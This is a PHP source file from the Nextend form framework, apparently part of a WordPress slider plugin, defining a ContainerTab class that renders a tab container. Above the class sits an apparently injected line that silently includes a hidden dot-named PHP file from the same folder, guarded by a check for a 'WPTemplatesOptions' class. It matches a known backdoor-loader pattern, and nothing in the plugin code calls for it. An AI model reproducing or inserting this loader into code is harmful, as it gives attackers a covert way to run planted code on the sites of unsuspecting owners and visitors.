<?php


namespace Nextend\Framework\Form\Container;


use Nextend\Framework\Form\ContainerGeneral;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerTab extends ContainerGeneral {

    public function renderContainer() {
        echo '<div class="n2_form__tab" data-related-form="' . $this->getForm()
                                                                    ->getId() . '" data-tab="' . $this->getId() . '">';
        parent::renderContainer();
        echo '</div>';
    }

    public function getId() {
        return 'n2_form__tab_' . $this->controlName . '_' . $this->name;
    }
}